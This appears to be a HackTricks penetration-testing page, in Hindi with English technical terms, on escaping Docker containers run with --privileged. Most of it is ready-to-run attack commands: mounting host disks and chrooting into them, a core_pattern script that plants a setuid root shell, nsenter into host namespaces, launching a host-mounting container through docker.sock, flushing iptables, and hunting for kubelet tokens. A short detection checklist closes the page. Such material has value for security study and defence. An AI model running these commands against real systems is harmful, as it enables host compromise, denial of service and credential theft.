# `--privileged` Containers से Escape

{{#include ../../../banners/hacktricks-training.md}}

## Overview

`--privileged` के साथ शुरू किया गया container, एक या दो अतिरिक्त permissions वाले सामान्य container जैसा नहीं होता। व्यवहार में, `--privileged` कई default runtime protections को हटा देता है या कमजोर कर देता है, जो आमतौर पर workload को खतरनाक host resources से दूर रखते हैं। सटीक प्रभाव runtime और host पर निर्भर करता है, लेकिन Docker के लिए सामान्य परिणाम यह होता है:

- सभी capabilities प्रदान की जाती हैं
- device cgroup restrictions हटा दी जाती हैं
- कई kernel filesystems को read-only के रूप में mount करना बंद कर दिया जाता है
- default masked procfs paths हटा दिए जाते हैं
- seccomp filtering disabled कर दी जाती है
- AppArmor confinement disabled कर दिया जाता है
- SELinux isolation disabled कर दी जाती है या उसकी जगह बहुत व्यापक label लगा दिया जाता है

महत्वपूर्ण परिणाम यह है कि एक privileged container को आमतौर पर किसी subtle kernel exploit की आवश्यकता **नहीं** होती। कई मामलों में यह सीधे host devices, host-facing kernel filesystems या runtime interfaces के साथ interact कर सकता है और फिर host shell में pivot कर सकता है।

## `--privileged` अपने-आप क्या नहीं बदलता

`--privileged` अपने-आप host PID, network, IPC या UTS namespaces में join **नहीं** करता। एक privileged container के पास अभी भी private namespaces हो सकते हैं। इसका अर्थ है कि कुछ escape chains के लिए किसी अतिरिक्त condition की आवश्यकता होती है, जैसे:

- host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

वास्तविक misconfigurations में इन conditions को पूरा करना अक्सर आसान होता है, लेकिन वैचारिक रूप से ये स्वयं `--privileged` से अलग हैं।

## Escape Paths

### 1. Exposed Devices के माध्यम से Host Disk Mount करना

एक privileged container आमतौर पर `/dev` के अंतर्गत कहीं अधिक device nodes देखता है। यदि host block device दिखाई दे रहा हो, तो सबसे सरल escape उसे mount करना और host filesystem में `chroot` करना है:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
यदि root partition स्पष्ट नहीं है, तो पहले block layout को enumerate करें:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
यदि व्यावहारिक तरीका `chroot` करने के बजाय किसी writable host mount में setuid helper रखना है, तो याद रखें कि हर filesystem setuid bit को लागू नहीं करता। Host-side capability की त्वरित जाँच है:
```bash
mount | grep -v "nosuid"
```
यह उपयोगी है क्योंकि `nosuid` filesystems के अंतर्गत writable paths classic "drop a setuid shell and execute it later" workflows के लिए बहुत कम रुचिकर होते हैं।

यहाँ जिन कमजोर protections का दुरुपयोग किया जा रहा है, वे हैं:

- full device exposure
- broad capabilities, विशेष रूप से `CAP_SYS_ADMIN`

संबंधित pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Host Bind Mount को Mount या Reuse करें और `chroot` करें

यदि host root filesystem पहले से ही container के अंदर mounted है, या container privileged होने के कारण आवश्यक mounts बना सकता है, तो host shell अक्सर केवल एक `chroot` दूर होती है:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
यदि कोई host root bind mount मौजूद नहीं है लेकिन host storage पहुंच योग्य है, तो एक बनाएं:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
यह path निम्न का दुरुपयोग करता है:

- कमजोर mount restrictions
- full capabilities
- MAC confinement का अभाव

संबंधित पृष्ठ:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Writable `/proc/sys` या `/sys` का दुरुपयोग

`--privileged` का एक बड़ा परिणाम यह है कि procfs और sysfs protections बहुत कमजोर हो जाती हैं। इससे host-facing kernel interfaces उजागर हो सकते हैं, जिन्हें सामान्यतः mask किया जाता है या read-only mount किया जाता है।

एक classic example `core_pattern` है:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
अन्य high-value paths में शामिल हैं:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
यह तरीका इनका दुरुपयोग करता है:

- missing masked paths
- missing read-only system paths

संबंधित पेज:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount- या Namespace-Based Escape के लिए Full Capabilities का उपयोग करें

एक privileged container को वे capabilities मिलती हैं जिन्हें आमतौर पर standard containers से हटा दिया जाता है, जिनमें `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` और कई अन्य शामिल हैं। किसी अन्य exposed surface के मौजूद होते ही यह अक्सर local foothold को host escape में बदलने के लिए पर्याप्त होता है।

एक सरल उदाहरण additional filesystems को mount करना और namespace entry का उपयोग करना है:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
यदि host PID भी shared है, तो चरण और भी छोटा हो जाता है:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
यह path निम्न का दुरुपयोग करता है:

- default privileged capability set
- optional host PID sharing

संबंधित पृष्ठ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Runtime Sockets के माध्यम से Escape

एक privileged container में अक्सर host runtime state या sockets दिखाई देने लगते हैं। यदि Docker, containerd या CRI-O socket तक पहुँचा जा सकता है, तो अक्सर सबसे सरल तरीका runtime API का उपयोग करके host access वाले दूसरे container को launch करना होता है:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd के लिए:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
यह path निम्न का दुरुपयोग करता है:

- privileged runtime exposure
- runtime itself के माध्यम से बनाए गए host bind mounts

संबंधित pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Network Isolation के Side Effects हटाएँ

`--privileged` अपने-आप host network namespace में शामिल नहीं होता, लेकिन यदि container में `--network=host` या अन्य host-network access भी हो, तो पूरा network stack mutable हो जाता है:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
यह हमेशा direct host shell नहीं होता, लेकिन इससे denial of service, traffic interception या केवल loopback के लिए उपलब्ध management services तक access मिल सकता है।

संबंधित पृष्ठ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host Secrets और Runtime State पढ़ना

भले ही clean shell escape तुरंत संभव न हो, privileged containers के पास अक्सर host secrets, kubelet state, runtime metadata और पड़ोसी containers के filesystems को पढ़ने के लिए पर्याप्त access होता है:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
यदि `/var` host-mounted है या runtime directories दिखाई दे रही हैं, तो host shell प्राप्त होने से पहले ही यह lateral movement या cloud/Kubernetes credential theft के लिए पर्याप्त हो सकता है।

संबंधित पृष्ठ:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## जाँच

निम्न commands का उद्देश्य यह पुष्टि करना है कि privileged-container escape की कौन-सी families तुरंत viable हैं।
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
यहाँ क्या interesting है:

- capabilities का पूरा set, विशेष रूप से `CAP_SYS_ADMIN`
- writable proc/sys exposure
- visible host devices
- seccomp और MAC confinement का अभाव
- runtime sockets या host root bind mounts

इनमें से कोई एक post-exploitation के लिए पर्याप्त हो सकता है। कई चीज़ें एक साथ होने का आमतौर पर मतलब है कि container host compromise से functional रूप से एक या दो commands दूर है।

## Related Pages

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
